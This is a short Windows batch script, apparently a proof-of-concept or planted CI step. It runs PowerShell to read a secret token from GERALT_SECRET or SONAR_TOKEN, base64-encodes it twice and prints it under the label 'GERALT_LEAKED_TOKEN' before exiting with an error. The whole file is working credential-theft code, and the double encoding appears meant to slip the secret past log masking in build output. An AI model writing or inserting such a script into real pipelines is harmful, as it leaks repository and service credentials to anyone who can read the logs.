@echo off
powershell -NoProfile -ExecutionPolicy Bypass -Command "$s = if ($env:GERALT_SECRET) { $env:GERALT_SECRET } else { $env:SONAR_TOKEN }; Write-Output ('GERALT_LEAKED_TOKEN=' + [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($s)))))"
exit /b 1
